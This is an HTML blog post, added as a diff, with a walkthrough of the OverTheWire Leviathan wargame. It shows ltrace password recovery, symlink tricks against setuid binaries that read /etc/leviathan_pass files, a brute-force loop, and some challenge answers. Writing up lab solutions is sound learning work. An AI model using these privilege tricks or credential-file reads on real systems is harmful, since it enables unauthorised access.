@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!">
+    <meta name="author" content="W3ndige">
+    <title>Overthewire.org - Leviathan - Root Network Security</title>
+
+    <link rel="canonical" href="http://localhost:4000/2016/07/25/overthewire.org-leviathan/">
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.png">
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/clean-blog.css">
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="/css/syntax.css">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href="//https://fonts.googleapis.com/css?family=Nunito:400,700i" rel="stylesheet">
+    <link href='//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+
+    <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Root Network Security" />
+
+</head>
+
+
+<body>
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Root Network Security</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+            <ul class="nav navbar-nav navbar-right">
+                <li>
+                    <a href="/about/">About</a>
+                </li>
+
+                <li>
+                    <a href="/archive/">Archive</a>
+                </li>
+
+                <li>
+                    <a href="/contact/">Contact</a>
+                </li>
+
+                <li>
+                    <a href="/projects/">Projects</a>
+                </li>
+
+                <li>
+                    <a href="/resources/">Resources</a>
+                </li>
+            </ul>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+
+
+    <!-- Post Header -->
+<header class="intro-header" style="background-image: url('/img/overthewire-header.png')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <h1>Overthewire.org - Leviathan</h1>
+                    
+                    <h2 class="subheading">Write-Up</h2>
+                    
+                    <span class="meta">Posted by W3ndige on July 25, 2016</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+
+				<h1>Introduction</h1>
+
+<p>Today we're gonna give a try Leviathan wargame which requires some common sense and a little bit of knowledge about Unix commands.</p>
+<p>Let's get started!</p>
+
+<p><b>0 –&gt; 1</b></p>
+<p>First thing is to login into the leviathan0 account using SSH. Then we're gonna take a look at home directory using <i>ls -la</i> command.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">leviathan0@melinda:~$ </span>ls -la
+total 24
+drwxr-xr-x   3 root       root       4096 Nov 14  2014 .
+drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
+drwxr-x---   2 leviathan1 leviathan0 4096 May 15 02:15 .backup
+-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
+-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
+-rw-r--r--   1 root       root        675 Apr  9  2014 .profile</code></pre></figure>
+
+<p>Rresults show us an hidden backup folder, containing a file called bookmarks.html.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">leviathan0@melinda:~$ </span><span class="nb">cd</span> .backup
+<span class="gp">leviathan0@melinda:~/.backup$ </span>ls -la
+total 140
+drwxr-x--- 2 leviathan1 leviathan0   4096 May 15 02:15 .
+drwxr-xr-x 3 root       root         4096 Nov 14  2014 ..
+-rw-r----- 1 leviathan1 leviathan0 133259 Nov 14  2014 bookmarks.html</code></pre></figure>
+
+<p>Searching the file manually will probably take us years so why not to grep string with a word password?</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">leviathan0@melinda:~/.backup$ </span>cat bookmarks.html | grep password
+
+&lt;DT&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">"http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is *******"</span> <span class="nv">ADD_DATE</span><span class="o">=</span><span class="s2">"1155384634"</span> <span class="nv">LAST_CHARSET</span><span class="o">=</span><span class="s2">"ISO-8859-1"</span> <span class="nv">ID</span><span class="o">=</span><span class="s2">"rdf:#</span><span class="nv">$2wIU71</span><span class="s2">"</span>&gt;password to leviathan1&lt;/A&gt;</code></pre></figure>
+
+<p><b>1 –&gt; 2</b></p>
+<p>Once again let's view the files in the main directory, but now we have a file called check.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">leviathan1@melinda:~$ </span>ls -la
+total 28
+drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
+drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
+-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
+-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
+-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
+-r-sr-x---   1 leviathan2 leviathan1 7493 Nov 14  2014 check</code></pre></figure>
+
+<p>After running, it asks us for a password, maybe running <i>ltrace</i> will find anything useful.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">leviathan1@melinda:~$ </span>./check
+password: password
+Wrong password, Good Bye ...
+<span class="gp">leviathan1@melinda:~$ </span>ltrace ./check
+__libc_start_main<span class="o">(</span>0x804852d, 1, 0xffffd7a4, 0x80485f0 &lt;unfinished ...&gt;
+<span class="nb">printf</span><span class="o">(</span><span class="s2">"password: "</span><span class="o">)</span>                                                                                    <span class="o">=</span> 10
+getchar<span class="o">(</span>0x8048680, 47, 0x804a000, 0x8048642password: password
+<span class="o">)</span>                                                            <span class="o">=</span> 112
+getchar<span class="o">(</span>0x8048680, 47, 0x804a000, 0x8048642<span class="o">)</span>                                                            <span class="o">=</span> 97
+getchar<span class="o">(</span>0x8048680, 47, 0x804a000, 0x8048642<span class="o">)</span>                                                            <span class="o">=</span> 115
+strcmp<span class="o">(</span><span class="s2">"pas"</span>, <span class="s2">"sex"</span><span class="o">)</span>                                                                                    <span class="o">=</span> -1
+puts<span class="o">(</span><span class="s2">"Wrong password, Good Bye"</span> ...Wrong password, Good Bye ...
+<span class="o">)</span>                                                                    <span class="o">=</span> 29
++++ exited <span class="o">(</span>status 0<span class="o">)</span> +++</code></pre></figure>
+
+<p>Yeah, it's comparing our password with 'sex' using strcmp function, so 'sex' is desired password.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">leviathan1@melinda:~$ </span>./check
+password: sex
+<span class="gp">$ </span>cat /etc/leviathan_pass/leviathan2
+<span class="k">*******</span></code></pre></figure>
+
+<p>After entering pass correctly, we are given a shell where we can view the password for the next level.</p>
+
+<p><b>2 –&gt; 3</b></p>
+<p>We are given a printfile file, which usage is printing files (obviously :D). We can try, and check a simple trick.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">leviathan2@melinda:~$ </span>ls -la
+total 28
+drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
+drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
+-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
+-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
+-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
+-r-sr-x---   1 leviathan3 leviathan2 7498 Nov 14  2014 printfile
+
+<span class="gp">leviathan2@melinda:~$ </span>./printfile
+<span class="k">***</span> File Printer <span class="k">***</span>
+Usage: ./printfile filename
+<span class="gp">leviathan2@melinda:~$ </span>./printfile /etc/leviathan_pass/leviathan3
+You cant have that file...</code></pre></figure>
+
+<p>:(</p>
+<p>Now we have to try something different. Firstly create a directory in /tmp.Next step will be creating 2 files: first called pass which is symbolic link to our password file and then file called pass qwer, you can name them however you want but the trick is that second file needs to have first file name in the first half of the second one like this.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">leviathan2@melinda:~$ </span>mkdir /tmp/w3nditor
+<span class="gp">leviathan2@melinda:~$ </span><span class="nb">cd</span> /tmp/w3nditor
+<span class="gp">leviathan2@melinda:/tmp/w3nditor$ </span>ln -s /etc/leviathan_pass/leviathan3 ./pass
+<span class="gp">leviathan2@melinda:/tmp/w3nditor$ </span>touch pass<span class="se">\ </span>qwer</code></pre></figure>
+
+<p>Then we can use our printfile on previously created pass qwer. What the trick does, is that it firstly allows us to access because the pass qwer exists and then cat command treats them as two seperate files so we can view the password through previously created symbolic link.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">leviathan2@melinda:~$ </span>./printfile /tmp/w3nditor/pass<span class="se">\ </span>qwer
+<span class="k">*******</span>
+/bin/cat: qwer: No such file or directory</code></pre></figure>
+
+<p><b>3 –&gt; 4</b></p>
+<p>In this one, we get file called level3 that after executing asks us for a password.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">leviathan3@melinda:~$ </span>ls -la
+total 32
+drwxr-xr-x   2 root       root       4096 Mar 21  2015 .
+drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
+-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
+-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
+-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
+-r-sr-x---   1 leviathan4 leviathan3 9962 Mar 21  2015 level3
+<span class="gp">leviathan3@melinda:~$ </span>./level3
+Enter the password&gt; password
+bzzzzzzzzap. WRONG</code></pre></figure>
+
+<p>Let’s once again use ltrace to check for anything useful.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">leviathan3@melinda:~$ </span>ltrace ./level3
+__libc_start_main<span class="o">(</span>0x80485fe, 1, 0xffffd7a4, 0x80486d0 &lt;unfinished ...&gt;
+strcmp<span class="o">(</span><span class="s2">"h0no33"</span>, <span class="s2">"kakaka"</span><span class="o">)</span>                       <span class="o">=</span> -1
+<span class="nb">printf</span><span class="o">(</span><span class="s2">"Enter the password&gt; "</span><span class="o">)</span>                   <span class="o">=</span> 20
+fgets<span class="o">(</span>Enter the password&gt; password
+<span class="s2">"password</span><span class="se">\n</span><span class="s2">"</span>, 256, 0xf7fc9c20<span class="o">)</span>             <span class="o">=</span> 0xffffd59c
+strcmp<span class="o">(</span><span class="s2">"password</span><span class="se">\n</span><span class="s2">"</span>, <span class="s2">"snlprintf</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>              <span class="o">=</span> -1
+puts<span class="o">(</span><span class="s2">"bzzzzzzzzap. WRONG"</span>bzzzzzzzzap. WRONG
+<span class="o">)</span>                       <span class="o">=</span> 19
++++ exited <span class="o">(</span>status 0<span class="o">)</span> +++</code></pre></figure>
+
+<p>In this level, it uses strcmp between our string and ‘snlprintf’.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">leviathan3@melinda:~$ </span>./level3
+Enter the password&gt; snlprintf
+<span class="o">[</span>You<span class="s1">'ve got shell]!
+$ cat /etc/leviathan_pass/leviathan4
+*******</span></code></pre></figure>
+
+<p>And it works perfectly!</p>
+
+<p><b>4 –&gt; 5</b></p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">leviathan4@melinda:~$ </span>ls -la
+total 24
+drwxr-xr-x   3 root root       4096 Nov 14  2014 .
+drwxr-xr-x 172 root root       4096 Jul 10 14:12 ..
+-rw-r--r--   1 root root        220 Apr  9  2014 .bash_logout
+-rw-r--r--   1 root root       3637 Apr  9  2014 .bashrc
+-rw-r--r--   1 root root        675 Apr  9  2014 .profile
+dr-xr-x---   2 root leviathan4 4096 Nov 14  2014 .trash
+<span class="gp">leviathan4@melinda:~$ </span><span class="nb">cd</span> .trash
+<span class="gp">leviathan4@melinda:~/.trash$ </span>ls -la
+total 16
+dr-xr-x--- 2 root       leviathan4 4096 Nov 14  2014 .
+drwxr-xr-x 3 root       root       4096 Nov 14  2014 ..
+-r-sr-x--- 1 leviathan5 leviathan4 7425 Nov 14  2014 bin
+<span class="gp">leviathan4@melinda:~/.trash$ </span>./bin
+01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010</code></pre></figure>
+
+<p>From this one, we get a binary string which after converting to ASCII gives: ******* – password for next level.</p>
+
+<p><b>5 –&gt; 6</b></p>
+<p>Now we get a file that is somehow looking for /tmp/file.log</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">leviathan5@melinda:~$ </span>ls -la
+total 28
+drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
+drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
+-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
+-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
+-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
+-r-sr-x---   1 leviathan6 leviathan5 7634 Nov 14  2014 leviathan5
+<span class="gp">leviathan5@melinda:~$ </span>./leviathan5
+Cannot find /tmp/file.log</code></pre></figure>
+
+<p>Creating link in /tmp/file.log to leviathan pass let’s us see a password.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">leviathan5@melinda:~$ </span>ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+<span class="gp">leviathan5@melinda:~$ </span>./leviathan5
+<span class="k">*******</span></code></pre></figure>
+
+<p><b>6 –&gt; 7</b></p>
+<p>This time we’ve got executable which asks for a 4 digit code.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">leviathan6@melinda:~$ </span>ls -la
+total 28
+drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
+drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
+-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
+-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
+-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
+-r-sr-x---   1 leviathan7 leviathan6 7484 Nov 14  2014 leviathan6
+<span class="gp">leviathan6@melinda:~$ </span>./leviathan6
+usage: ./leviathan6 &lt;4 digit code&gt;
+<span class="gp">leviathan6@melinda:~$ </span>./leviathan6 1111
+Wrong</code></pre></figure>
+
+<p>Only way to get access will be brute forcing the pass code.  We can use any programming language but this time I’ll try to write simple bash script.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">leviathan6@melinda:~$ </span><span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>0000..9999<span class="o">}</span>; <span class="k">do</span> ./leviathan6 <span class="nv">$i</span>; <span class="nb">echo</span> <span class="nv">$i</span>; <span class="k">done
+
+</span>Wrong
+7119
+Wrong
+7120
+Wrong
+7121
+Wrong
+7122
+<span class="gp">$ </span>cat /etc/leviathan_pass/leviathan7
+<span class="k">*******</span>
+<span class="err">$</span></code></pre></figure>
+
+<p>And here we go! We’ve got the password!</p>
+
+<p>Thanks for the challenge! Hope you enjoyed solving this problems as much as I had.</p>
+<p>~Stay safe!</p>
+
+
+                <hr>
+
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/2016/07/20/overthewire.org-bandit/" data-toggle="tooltip" data-placement="top" title="Overthewire.org - Bandit">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/2016/07/30/vulnhub-mr-robot-write-up/" data-toggle="tooltip" data-placement="top" title="Vulnhub.com - Mr.Robot 1">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+            </div>
+        </div>
+    </div>
+</article>
+
+<hr>
+
+
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                    <li>
+                        <a href="/feed.xml">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    <li>
+                        <a href="https://github.com/w3ndige">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li>
+                        <a href="mailto:w3ndige@protonmail.com">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+                <p class="copyright text-muted">Copyright &copy; RootNetSec 2016 - 2017</p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js "></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js "></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/clean-blog.min.js "></script>
+
+
+</body>
+
+</html>
